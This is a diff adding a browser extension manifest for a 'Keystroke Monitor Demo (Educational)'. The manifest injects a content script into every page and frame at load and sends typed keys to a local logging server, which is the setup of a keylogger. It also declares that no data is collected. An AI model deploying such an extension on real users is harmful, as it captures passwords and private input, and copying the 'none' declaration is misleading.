@@ -1,0 +1,36 @@
+{
+  "manifest_version": 3,
+  "name": "Keystroke Monitor Demo (Educational)",
+  "version": "2.1.0",
+  "description": "Educational port of main.py. Sends keys typed on web pages to a local server (127.0.0.1) that writes log.txt.",
+  "permissions": ["storage"],
+  "host_permissions": [
+    "http://127.0.0.1:5000/*",
+    "http://localhost:5000/*"
+  ],
+  "action": {
+    "default_title": "Keystroke Monitor Demo",
+    "default_popup": "popup.html"
+  },
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "browser_specific_settings": {
+    "gecko": {
+      "id": "keystroke-monitor-demo@educational.local",
+      "strict_min_version": "140.0",
+      "data_collection_permissions": {
+        "required": ["none"]
+      }
+    }
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_start",
+      "all_frames": true,
+      "match_about_blank": true
+    }
+  ]
+}
